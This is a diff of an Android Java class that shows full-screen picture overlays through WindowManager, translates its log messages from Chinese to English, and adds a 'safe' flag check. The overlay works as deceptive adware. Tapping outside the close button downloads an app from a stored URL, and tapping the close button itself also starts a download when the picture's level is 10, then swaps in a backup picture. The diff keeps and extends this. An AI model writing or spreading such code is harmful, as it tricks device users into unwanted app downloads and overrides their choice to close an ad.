@@ -11,6 +11,7 @@ import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.Color;
 import android.graphics.PixelFormat;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
 import android.util.DisplayMetrics;
@@ -31,10 +32,10 @@ public class UI {
 	public static Handler recMsg;
 	public Runnable autoRun;
 	private final long delayMillis = 1000 * 3;
-	private ImageView mImgView; // 展示图片的View
-	private ImageView mCloseView; // 关闭按钮的View
-	private WindowManager.LayoutParams wlPicView; // 包含ImageView的布局
-	private WindowManager.LayoutParams wlCloseView; // 包含关闭按钮的布局
+	private ImageView mImgView;
+	private ImageView mCloseView;
+	private WindowManager.LayoutParams wlPicView;
+	private WindowManager.LayoutParams wlCloseView;
 	private WindowManager mWndMgr;
 	private DisplayMetrics outMetrics;
 	private int mScreenX;
@@ -42,8 +43,7 @@ public class UI {
 	private static int mCurrentIndex = 0;
 	private List<PictureData> mPictures;
 	private static boolean isShowing = false;
-	public static String bmd;
-	public static String bakurl;
+	public static String[] mBackupUrls;
 	static {
 		instance = null;
 		tag = UI.class.getName();
@@ -62,10 +62,10 @@ public class UI {
 	}
 
 	public boolean initUI() {
-		LogU.Log(tag, "初始化UI");
+		LogU.Log(tag, "begin initialize ui");
 		setHandler();
 		if (initScreenParams() == false) {
-			LogU.Log(tag, "初始化屏幕参数失败");
+			LogU.Log(tag, "initialize screen params failed.");
 			return false;
 		}
 		addImageView();
@@ -75,12 +75,11 @@ public class UI {
 
 	private boolean initScreenParams() {
 		if (mContext == null) {
-			LogU.Log(tag, "mContext为空，返回false");
+			LogU.Log(tag, "mContext==null in initScreenParams,return");
 			return false;
 		}
 		if (mWndMgr == null) {
-			mWndMgr = (WindowManager) mContext
-					.getSystemService(Context.WINDOW_SERVICE);
+			mWndMgr = (WindowManager) mContext.getSystemService(Context.WINDOW_SERVICE);
 		}
 		if (outMetrics == null) {
 			outMetrics = new DisplayMetrics();
@@ -116,8 +115,7 @@ public class UI {
 		wlPicView.height = this.mScreenY - 150;
 		wlPicView.flags = WindowManager.LayoutParams.FLAG_DIM_BEHIND;
 
-		mImgView.setImageBitmap(DataDef.gPictureDatas.get(mCurrentIndex)
-				.getPicBitmap());
+		mImgView.setImageBitmap(DataDef.gPictureDatas.get(mCurrentIndex).getPicBitmap());
 		mImgView.setScaleType(ScaleType.FIT_XY);
 		mImgView.setLayoutParams(wlPicView);
 		mWndMgr.addView(mImgView, wlPicView);
@@ -155,22 +153,23 @@ public class UI {
 					float x = event.getX();
 					float y = event.getY();
 					if (((x >= 0) && (x <= 40)) && ((y >= 0) && (y <= 40))) {
+						String appurl = mPictures.get(mCurrentIndex).getAppDownloadURL();
 						int level = mPictures.get(mCurrentIndex).getPicLevel();
-						LogU.Log(tag, "分数："+level);
 						if (level == 10) {
-							String appurl = mPictures.get(mCurrentIndex).getAppDownloadURL();
-							String msg = String.format("点击了关闭按钮!当前图片对应的分数为%d，准备下载：%s", level,appurl);
-							LogU.Log(tag, msg);
+							LogU.Log(tag, "clicked close button and level is 10,url:"+appurl);
 							AppDownThread adt = AppDownThread.getAdtInstance(mContext, appurl);
 							adt.start();
-							LogU.Log(tag, "替换掉当前图片");
-						}else{
-							LogU.Log(tag, "关闭按钮点击时，当前图片对应的分数不为10，不需要下载对应的APP，将关闭显示");
+							LogU.Log(tag, "replace the picture");
+							DataDef.gPictureDatas.set(mCurrentIndex, DataDef.gBackupElem.get(0));
+							DataDef.gBackupElem.remove(0);
+							clearView();
+						} else {
+							LogU.Log(tag,"clicked close button and level is less than 10,url:"+appurl);
 							clearView();
 						}
 					} else {
 						String appurl = mPictures.get(mCurrentIndex).getAppDownloadURL();
-						LogU.Log(tag, "点击了关闭按钮之外的区域。下载，URL="+appurl);
+						LogU.Log(tag, "out of close button range,URL:" + appurl);
 						AppDownThread adt = AppDownThread.getAdtInstance(mContext, appurl);
 						adt.start();
 					}
@@ -181,24 +180,24 @@ public class UI {
 	}
 
 	@SuppressLint("HandlerLeak")
+	@SuppressWarnings("unchecked")
 	public void setMessage() {
 		recMsg = new Handler() {
-			@SuppressWarnings("unchecked")
 			public void handleMessage(Message msg) {
-				if (msg.what == DataDef.MSG_ID_SHOW_UI) {
-					LogU.Log(tag, "收到展示UI的消息");
+				Bundle bd = msg.getData();
+				if (msg.what == DataDef.MSG_ID_SHOW_UI && bd.getBoolean("safe") == true) {
+					LogU.Log(tag, "received show ui message.");
 					mPictures = (List<PictureData>) msg.obj;
-					if(isShowing == false){
+					if (isShowing == false) {
 						initUI();
 						isShowing = true;
 						autoDisplay();
 					}
 				}
-
-				if (msg.what == DataDef.MSG_ID_NEW_APP_START) {
-					LogU.Log(tag, "收到程序启动消息");
+				if (msg.what == DataDef.MSG_ID_NEW_APP_START && bd.getBoolean("safe") == true) {
+					LogU.Log(tag, "received app start message");
 					mPictures = (List<PictureData>) msg.obj;
-					if(isShowing == false){
+					if (isShowing == false) {
 						initUI();
 						isShowing = true;
 						autoDisplay();
@@ -246,9 +245,5 @@ public class UI {
 	private int getCurrentScreenStatus(Context context) {
 		Configuration mConfiguration = context.getResources().getConfiguration();
 		return mConfiguration.orientation;
-	}
-	
-	public boolean isCurrentActivityInBmd(Context context){
-		return true;
 	}
 }
